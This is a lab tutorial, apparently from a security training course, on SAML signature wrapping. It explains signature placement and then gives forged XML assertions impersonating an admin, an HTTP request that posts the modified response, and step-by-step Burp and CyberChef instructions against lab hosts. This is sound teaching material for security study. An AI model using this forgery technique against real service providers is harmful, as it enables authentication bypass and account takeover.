# Signature Wrapping Attack

Signature Wrapping is a class of attack against SAML implementations that intends to create a discrepancy between the signature verification logic and the logic extracting the authentication information from the SAML assertion. This is achieved by injecting XML elements into the SAML response that do not invalidate the signature but potentially confuse the application, resulting in the application using the injected and unsigned authentication information instead of the signed authentication information.

For more details on the attack, check out this paper.

## Theory

The SAML IdP can sign the entire SAML response or only the SAML Assertion. The element signed by a `ds:Signature` XML-node is referenced in the `ds:Reference` XML-node. For instance, let us consider the following SAML response:

```xml
<samlp:Response ID="_941d62a2c2213add334c8e31ea8c11e3d177eba142" [...] >
	[...]
	<saml:Assertion ID="_3227482244c22633671f7e3df3ee1a24a51a53c013" [...] >
	    [...]
	    <ds:Signature>
	        <ds:SignedInfo>
	            [...]
	            <ds:Reference URI="#_3227482244c22633671f7e3df3ee1a24a51a53c013">
                [...]
	            </ds:Reference>
	        </ds:SignedInfo>
	    </ds:Signature>
	    [...]
	 </saml:Assertion>   
</samlp:Response>
```
As we can see, the `ds:Signature` node contains a `ds:Reference` node containing a `URI` attribute with the value `#_3227482244c22633671f7e3df3ee1a24a51a53c013`. This indicates that the signature was computed over the XML node with the ID `_3227482244c22633671f7e3df3ee1a24a51a53c013`. As we can see, this is the ID of the SAML assertion, so, in this case, the signature does not protect the entire SAML response but only the SAML assertion.

Furthermore, there are different locations where the signature can be located:

*   enveloped signatures are descendants of the signed resource
*   enveloping signatures are predecessors of the signed resource
*   detached signatures are neither descendants nor predecessors of the signed resource

For instance, the above example is an enveloped signature, as the signature is a descendant of the `saml:Assertion` node, which it protects.

On the other hand, the following would be an example of an enveloping signature, as the signature is a predecessor of the `saml:Assertion` node, which it protects.

```xml
<samlp:Response ID="_941d62a2c2213add334c8e31ea8c11e3d177eba142" [...] >
	[...]
	<ds:Signature>
		<ds:SignedInfo>
		    [...]
		    <ds:Reference URI="#_3227482244c22633671f7e3df3ee1a24a51a53c013">
	            [...]
		    </ds:Reference>
	    </ds:SignedInfo>
		<saml:Assertion ID="_3227482244c22633671f7e3df3ee1a24a51a53c013" [...] >
		    [...]    
		</saml:Assertion> 
		[...]
	</ds:Signature>
</samlp:Response>
```
Lastly, the following is an example of a detached signature:

```xml
<samlp:Response ID="_941d62a2c2213add334c8e31ea8c11e3d177eba142" [...] >
	[...]
	<saml:Assertion ID="_3227482244c22633671f7e3df3ee1a24a51a53c013" [...] >
	    [...]
	 </saml:Assertion> 
	 <ds:Signature>
	    <ds:SignedInfo>
		    [...]
		    <ds:Reference URI="#_3227482244c22633671f7e3df3ee1a24a51a53c013">
                [...]
	        </ds:Reference>
	    </ds:SignedInfo>
	</ds:Signature>
	[...]
</samlp:Response>
```
Due to these permutations, there are different kinds of signature wrapping attacks that can be applied depending on what XML node is signed and where the signature is located. For simplicity's sake, we will only focus on a single type of signature wrapping attack.

Consider a SAML response with an enveloped signature that protects only the SAML assertion. The structure looks like this:

`Diagram of SAML structure. Response with ID. Contains Assertion with ID. Assertion includes Subject and Signature. Signature contains SignedInfo. SignedInfo references URI.`

Now, to create a discrepancy between the signature verification logic and the application logic, we can inject a new SAML assertion before the signed assertion, resulting in the following structure:

`Diagram of SAML structure. Response with ID. Contains Assertion with ID. Assertion includes Subject and Signature. Signature contains SignedInfo. SignedInfo references URI.`

This does not invalidate the signature since the signed assertion remains unchanged and is still present in the SAML response. Furthermore, the SAML response is not protected by a signature, and thus, we can inject an additional assertion.

The signature wrapping attack is successful if the following holds:

*   The signature verification logic searches the SAML response for the `ds:Signature` node and the element referenced in the `ds:Reference` element. The signature is then verified, and no additional checks are performed (such as a check of the number of SAML assertions present in the SAML response)
*   The application logic retrieves authentication information from the first SAML assertion it finds within the SAML response

Since the application logic does not explicitly retrieve the authentication information from the SAML assertion referenced in the `ds:Reference` node that is protected by the signature but rather retrieves the information from the first assertion in the SAML response, it will use our injected SAML assertion which is not protected by any signature and thus we can manipulate it arbitrarily.

## Execution

To execute the signature wrapping attack discussed above, we first need to obtain the XML representation of the SAML response as described in the previous section. After verifying that the SAML response has the above structure, we can copy the `saml:Assertion` node. After removing the signature, we are left with the following data:

```xml
<saml:Assertion xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xs="http://www.w3.org/2001/XMLSchema" ID="_3227482244c22633671f7e3df3ee1a24a51a53c013" Version="2.0" IssueInstant="2024-03-31T09:57:18Z">
	<saml:Issuer>
		http://sso.htb/simplesaml/saml2/idp/metadata.php
	</saml:Issuer>
	<saml:Subject>
		<saml:NameID SPNameQualifier="http://academy.htb/" Format="urn:oasis:names:tc:SAML:2.0:nameid-format:transient">
			_ce163f0a42951fc08b82c0d5760d6a3d9088faec7b
		</saml:NameID>
		<saml:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
			<saml:SubjectConfirmationData NotOnOrAfter="2024-03-31T10:02:18Z" Recipient="http://academy.htb/acs.php" InResponseTo="ONELOGIN_8fd53e48e8ff2da4bca7a64d5153610168e04af4"/>
		</saml:SubjectConfirmation>
	</saml:Subject>
	<saml:Conditions NotBefore="2024-03-31T09:56:48Z" NotOnOrAfter="2024-03-31T10:02:18Z">
		<saml:AudienceRestriction>
			<saml:Audience>http://academy.htb/</saml:Audience>
		</saml:AudienceRestriction>
	</saml:Conditions>
	<saml:AuthnStatement AuthnInstant="2024-03-31T09:57:18Z" SessionNotOnOrAfter="2024-03-31T17:57:18Z" SessionIndex="_9063d2a0ba9a6fdcf99fa79efccc10bd00539b5949">
		<saml:AuthnContext>
			<saml:AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:Password</saml:AuthnContextClassRef>
		</saml:AuthnContext>
	</saml:AuthnStatement>
	<saml:AttributeStatement>
		<saml:Attribute Name="id" NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:basic">
			<saml:AttributeValue xsi:type="xs:string">1337</saml:AttributeValue>
		</saml:Attribute>
		<saml:Attribute Name="name" NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:basic">
			<saml:AttributeValue xsi:type="xs:string">htb-stdnt</saml:AttributeValue>
		</saml:Attribute>
		<saml:Attribute Name="email" NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:basic">
			<saml:AttributeValue xsi:type="xs:string">htb-stdnt@academy.htb</saml:AttributeValue>
		</saml:Attribute>
	</saml:AttributeStatement>
</saml:Assertion>
```
Let us manipulate the assertion by changing the ID to `_evilID` and manipulating the attributes to enable us to authenticate as the `admin` user. We will change the user ID to `1`, the username to `admin`, and the email to `admin@academy.htb`, resulting in the following manipulated assertion:

```xml
<saml:Assertion xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xs="http://www.w3.org/2001/XMLSchema" ID="_evilID" Version="2.0" IssueInstant="2024-03-31T09:57:18Z">
	<saml:Issuer>
		http://sso.htb/simplesaml/saml2/idp/metadata.php
	</saml:Issuer>
	<saml:Subject>
		<saml:NameID SPNameQualifier="http://academy.htb/" Format="urn:oasis:names:tc:SAML:2.0:nameid-format:transient">
			_ce163f0a42951fc08b82c0d5760d6a3d9088faec7b
		</saml:NameID>
		<saml:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
			<saml:SubjectConfirmationData NotOnOrAfter="2024-03-31T10:02:18Z" Recipient="http://academy.htb/acs.php" InResponseTo="ONELOGIN_8fd53e48e8ff2da4bca7a64d5153610168e04af4"/>
		</saml:SubjectConfirmation>
	</saml:Subject>
	<saml:Conditions NotBefore="2024-03-31T09:56:48Z" NotOnOrAfter="2024-03-31T10:02:18Z">
		<saml:AudienceRestriction>
			<saml:Audience>http://academy.htb/</saml:Audience>
		</saml:AudienceRestriction>
	</saml:Conditions>
	<saml:AuthnStatement AuthnInstant="2024-03-31T09:57:18Z" SessionNotOnOrAfter="2024-03-31T17:57:18Z" SessionIndex="_9063d2a0ba9a6fdcf99fa79efccc10bd00539b5949">
		<saml:AuthnContext>
			<saml:AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:Password</saml:AuthnContextClassRef>
		</saml:AuthnContext>
	</saml:AuthnStatement>
	<saml:AttributeStatement>
		<saml:Attribute Name="id" NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:basic">
			<saml:AttributeValue xsi:type="xs:string">1</saml:AttributeValue>
		</saml:Attribute>
		<saml:Attribute Name="name" NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:basic">
			<saml:AttributeValue xsi:type="xs:string">admin</saml:AttributeValue>
		</saml:Attribute>
		<saml:Attribute Name="email" NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:basic">
			<saml:AttributeValue xsi:type="xs:string">admin@academy.htb</saml:AttributeValue>
		</saml:Attribute>
	</saml:AttributeStatement>
</saml:Assertion>
```
We can inject our manipulated assertion into the SAML response to achieve the above structure. This results in the following SAML response. Note that the first assertion is our injected assertion, while the second assertion is the original unchanged and signed assertion:

```xml
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" ID="_941d62a2c2213add334c8e31ea8c11e3d177eba142" Version="2.0" IssueInstant="2024-03-31T09:57:18Z" Destination="http://academy.htb/acs.php" InResponseTo="ONELOGIN_8fd53e48e8ff2da4bca7a64d5153610168e04af4">
	<saml:Issuer>http://sso.htb/simplesaml/saml2/idp/metadata.php</saml:Issuer>
	<samlp:Status>
		<samlp:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/>
	</samlp:Status>
	<saml:Assertion xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xs="http://www.w3.org/2001/XMLSchema" ID="_evilID" Version="2.0" IssueInstant="2024-03-31T09:57:18Z">
		[...]
	</saml:Assertion>
	<saml:Assertion xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xs="http://www.w3.org/2001/XMLSchema" ID="_3227482244c22633671f7e3df3ee1a24a51a53c013" Version="2.0" IssueInstant="2024-03-31T09:57:18Z">
		[...]
	</saml:Assertion>
</samlp:Response>
```
The final step is Base64-encoding and then URL-encoding the SAML response before sending it to the service provider in the following request:

```http
POST /acs.php HTTP/1.1
Host: academy.htb
Content-Length: 8801
Content-Type: application/x-www-form-urlencoded

SAMLResponse=PHNhbW[...]%2b&RelayState=%2Facs.php
```
This enables us to authenticate as the `admin` user.

To perform the attack:
1.  Add `academy.htb` and `sso.htb` to your `/etc/hosts` file.
2.  Navigate to `academy.htb` and log in with valid credentials (e.g., `htb-stdnt:AcademyStudent!`).
3.  Refresh the page, intercept the request with Burp Suite, and send it to Repeater.
4.  In Repeater, URL-decode and then Base64-decode the `SAMLResponse` parameter using CyberChef (recipe: `URL Decode` -> `From Base64`).
5.  Copy the `saml:Assertion` node. Remove the `ds:Signature` from the copied assertion. Change the ID of the copied assertion to `_evilID` and modify the attributes to authenticate as `admin` (e.g., `id=1`, `name=admin`, `email=admin@academy.htb`).
6.  Inject the manipulated assertion before the original (signed) assertion in the SAML response.
7.  Base64-encode and then URL-encode the modified XML data using CyberChef (recipe: `To Base64` -> `URL Encode (Full)`).
8.  Replace the `SAMLResponse` in Burp Repeater with the newly encoded data and forward the request.
9.  You should now be authenticated as the `admin` user.
